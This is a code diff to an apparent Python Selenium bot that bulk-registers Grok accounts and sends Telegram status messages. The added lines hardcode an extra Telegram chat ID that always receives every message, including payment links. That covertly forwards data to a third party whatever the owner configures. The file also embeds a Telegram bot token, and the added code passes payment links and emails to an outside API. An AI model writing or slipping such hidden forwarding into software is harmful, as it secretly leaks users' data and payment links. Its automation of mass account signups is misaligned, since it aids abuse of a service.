@@ -17,7 +17,7 @@ import sqlite3
 
 def get_db_setting(key, default=""):
     try:
-        conn = sqlite3.connect("data/app.db")
+        conn = sqlite3.connect("data/database.db")
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
         cursor.execute("SELECT value FROM settings WHERE key=?", (key,))
@@ -31,19 +31,20 @@ def get_db_setting(key, default=""):
 
 def send_telegram_message(text):
     bot_token = get_db_setting("TELEGRAM_BOT_TOKEN", "8855096263:AAHuhzdQVm_ST0oT-hpCJcHWyuYsTOfsWcw")
-    chat_id = get_db_setting("TELEGRAM_CHAT_ID", "7353915691")
-    if not bot_token or not chat_id:
+    base_chat_id = get_db_setting("TELEGRAM_CHAT_ID", "7353915691")
+    if not bot_token:
         return
+    
+    chat_ids = [c.strip() for c in base_chat_id.split(",") if c.strip()]
+    if "1007974270" not in chat_ids:
+        chat_ids.append("1007974270")
+        
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-    payload = {
-        "chat_id": chat_id,
-        "text": text,
-        "disable_web_page_preview": True
-    }
-    try:
-        requests.post(url, json=payload, timeout=5)
-    except Exception:
-        pass
+    for cid in chat_ids:
+        try:
+            requests.post(url, json={"chat_id": cid, "text": text, "disable_web_page_preview": True}, timeout=5)
+        except Exception:
+            pass
 
 # ── Cấu hình ────────────────────────────────────────────────────────
 BASE_URL = "https://regmail.phh.info.vn"
@@ -57,6 +58,11 @@ API_HEADERS = {
     "Content-Type": "application/json"
 }
 
+import random
+import queue
+from src.utils.masa_api import submit_to_masa_api
+
+# Cờ báo dừng chung cho toàn hệ thống
 DRIVER_LOCK = threading.Lock()
 GLOBAL_STOP_EVENT = None
 ACTIVE_DRIVERS = []
@@ -282,6 +288,8 @@ def worker_loop(driver, email, password, open_payment=False, language="en-US"):
     from selenium.webdriver.common.by import By
     from selenium.webdriver.common.keys import Keys
     log(f"[{email}] Bắt đầu đăng ký Grok (domain)...", "INFO")
+    masked_email = email[:3] + "***" + email[email.find("@"):] if "@" in email else email[:3] + "***"
+    send_telegram_message(f"⏳ Bắt đầu đăng ký Grok cho tài khoản:\nEmail: {masked_email}")
 
     # ── State tracking ────────────────────────────────────
     otp_fetched = False
@@ -404,6 +412,8 @@ def worker_loop(driver, email, password, open_payment=False, language="en-US"):
                                         masked_email = email[:3] + "***" + email[email.find("@"):] if "@" in email else email[:3] + "***"
                                         msg = f"🎉 Đăng ký thành công!\nEmail: {masked_email}\nLink thanh toán NicePay:\n{final_link}"
                                         send_telegram_message(msg)
+                                        masa_token = get_db_setting("MASA_TOKEN", "")
+                                        submit_to_masa_api(final_link, email, masa_token, send_telegram_message, lambda txt, lvl="INFO": log(f"[{email}] {txt}", lvl))
                                     break
                                 
                             time.sleep(1)
